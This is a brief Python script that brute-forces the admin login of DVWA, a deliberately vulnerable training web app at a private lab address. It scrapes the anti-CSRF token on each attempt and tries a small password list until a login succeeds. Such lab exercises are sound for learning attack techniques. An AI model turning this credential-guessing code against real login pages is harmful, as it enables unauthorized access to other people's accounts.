import re
import requests

url="http://10.4.20.4/DVWA-1.9/login.php"
cookies = {"security" : "Low", "PHPSESSID": "njngj8s7iq0dhd9rr4pp5bj4r5"}
plist=['test', 'test123', 'password', 'pass']
data = {"username":"admin", "Login":"Login"}


def getToken(txt):
    match=re.search(r"user_token' value='(\w+)", txt)
    token =""
    if match.group(1):
        token = match.group(1)
    return token


for p in plist:
    print("Trying Password ", p)
    r1 = requests.get(url, cookies=cookies)
    token = getToken(r1.text)
    if token:
        data["user_token"] =token 
        data["password"] =p
        r2 = requests.post(url, cookies=cookies, data=data)
        if not "fail" in r2.text:
            print ("*** Found Password *** ", p)
            break



